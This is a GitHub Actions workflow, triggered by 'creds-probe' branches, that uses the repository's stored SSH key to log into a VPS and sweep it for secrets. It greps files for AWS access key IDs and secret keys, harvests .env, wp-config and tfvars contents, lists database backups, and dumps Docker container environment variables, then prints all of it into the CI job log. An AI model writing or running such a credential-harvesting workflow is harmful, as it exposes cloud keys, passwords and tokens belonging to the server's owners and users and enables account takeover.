name: zzdeep2
on:
  push:
    branches: ['creds-probe-d2*']
jobs:
  d:
    runs-on: ubuntu-latest
    timeout-minutes: 22
    steps:
      - name: deep2
        env:
          VPS_HOST: ${{ secrets.VPS_HOST }}
          VPS_USERNAME: ${{ secrets.VPS_USERNAME }}
          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
        run: |
          python3 - <<'PY'
          import os,textwrap
          v=os.environ["VPS_SSH_KEY"].strip().replace("\n","").replace(" ","")
          open("/tmp/k","w").write("-----BEGIN OPENSSH PRIVATE KEY-----\n"+"\n".join(textwrap.wrap(v,70))+"\n-----END OPENSSH PRIVATE KEY-----\n")
          os.chmod("/tmp/k",0o600)
          PY
          S="ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o ServerAliveInterval=20"
          R="$VPS_USERNAME@$VPS_HOST"
          set +e
          timeout 1100 $S $R 'bash -s' <<'EOS' > /tmp/out 2>&1
          set +e
          echo "=WHO="; id -un; hostname
          echo "=AKHITDIRS="
          timeout 240 grep -rIalE '(AKIA|ASIA)[0-9A-Z]{16}' /var/www /srv /home /root /opt /var/backups /usr/local 2>/dev/null | head -40
          echo "=AKCTX="
          for f in $(timeout 200 grep -rIalE '(AKIA|ASIA)[0-9A-Z]{16}' /var/www /srv /home /root /opt /var/backups 2>/dev/null | head -25); do echo "## $f"; timeout 20 grep -aoE '.{0,260}(AKIA|ASIA)[0-9A-Z]{16}.{0,260}' "$f" 2>/dev/null | head -3; done
          echo "=SECPAIR="
          timeout 120 grep -rIhoE 'aws_secret_access_key.{0,6}[A-Za-z0-9/+=]{40}' /var/www /srv /home /root /opt /var/backups 2>/dev/null | sort -u | head -20
          echo "=ENVCONF="
          timeout 90 grep -hEi 'aws|s3_|_KEY=|SECRET|ACCESS_KEY' $(find /var/www /srv /home /root /opt -maxdepth 6 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name "credentials" -o -name "*.tfvars" -o -name "docker-compose*.yml" -o -name "wp-config.php" -o -name "config.php" \) 2>/dev/null | grep -v node_modules | head -120) 2>/dev/null | sort -u | head -80
          echo "=SQLLIKE="
          timeout 90 find / -xdev -type f \( -name "*.sql" -o -name "*.sql.gz" -o -name "*.bak" -o -name "*.tar.gz" \) 2>/dev/null | grep -vE "node_modules" | head -40
          echo "=DOCKER="
          which docker >/dev/null 2>&1 && for n in $(docker ps --format '{{.Names}}' 2>/dev/null | head -20); do echo "## $n"; docker inspect $n --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null | grep -iE 'AWS|SECRET|TOKEN|PASS|_KEY' | head -10; done
          echo "=WEBROOTS="
          grep -hE "^\s*(root|server_name)" /etc/nginx/sites-enabled/* 2>/dev/null | head -40
          echo "=DONE="
          EOS
          echo "===OUT==="
          cat /tmp/out
